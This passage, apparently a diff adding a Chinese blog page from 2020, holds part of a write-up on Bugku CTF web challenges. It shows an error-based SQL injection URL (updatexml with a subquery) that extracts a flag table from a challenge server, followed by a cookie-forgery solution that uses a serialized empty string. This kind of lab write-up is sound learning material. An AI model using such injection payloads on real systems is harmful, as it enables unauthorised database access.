class="line"></span><br><span class="line">http://<span class="number">123.206</span><span class="number">.87</span><span class="number">.240</span>:<span class="number">9004</span>/Once_More.php</span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)--+</span><br><span class="line"><span class="comment">#flag&#123;Bugku-sql_6s-2i-4t-bug&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a><strong>flag.php</strong></h5><img src="http://img.kawhi.xyz/image-20200331150635411.png" alt="image-20200331150635411" style="high:80%;width:80%;" />
+
+<p>打开发现如上：</p>
+<p>底下还有一段：</p>
+<img src="http://img.kawhi.xyz/image-20200331150809369.png" alt="image-20200331150809369" style="high:80%;width:80%;" />
+
+<p>应该迷惑的，KEY的值是0。上面并没有定义。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">print_r(serialize(<span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:0:&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后传参cookie即可：ISecer=s:0:””</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/21/esp8266%E8%BF%9E%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/" rel="prev" title="esp8266连接显示器">
+      <i class="fa fa-chevron-left"></i> esp8266连接显示器
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/19/%E5%A6%82%E4%BD%95%E7%94%A8PIL%E5%BA%93%E5%A4%84%E7%90%86%E5%9B%BE%E7%89%87/" rel="next" title="如何用PIL库处理图片">
+      如何用PIL库处理图片 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF"><span class="nav-number">2.</span> <span class="nav-text">备份是个好习惯</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%98%E9%87%8F1"><span class="nav-number">3.</span> <span class="nav-text">变量1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#flag%E5%9C%A8index%E9%87%8C"><span class="nav-number">4.</span> <span class="nav-text">flag在index里</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%88%90%E7%BB%A9%E5%8D%95"><span class="nav-number">5.</span> <span class="nav-text">成绩单</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%80%81%E5%8F%B8%E6%9C%BA"><span class="nav-number">6.</span> <span class="nav-text">秋名山老司机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB"><span class="nav-number">7.</span> <span class="nav-text">速度要快</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cookie%E6%AC%BA%E9%AA%97"><span class="nav-number">8.</span> <span class="nav-text">cookie欺骗</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Never-give-up"><span class="nav-number">9.</span> <span class="nav-text">Never give up</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F"><span class="nav-number">10.</span> <span class="nav-text">字符？正则？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#web8"><span class="nav-number">11.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B1%82getshell"><span class="nav-number">12.</span> <span class="nav-text">求getshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#INSERT-INTO%E6%B3%A8%E5%85%A5"><span class="nav-number">13.</span> <span class="nav-text">INSERT INTO注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%9A%E6%AC%A1"><span class="nav-number">14.</span> <span class="nav-text">多次</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#flag-php"><span class="nav-number">15.</span> <span class="nav-text">flag.php</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kawhi"
+      src="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+  <p class="site-author-name" itemprop="name">kawhi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.tattooo.top/" title="https:&#x2F;&#x2F;www.tattooo.top" rel="noopener" target="_blank">Tattoo's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.plasf.cn/" title="https:&#x2F;&#x2F;www.plasf.cn&#x2F;" rel="noopener" target="_blank">Xiao Leung's Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kawhi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
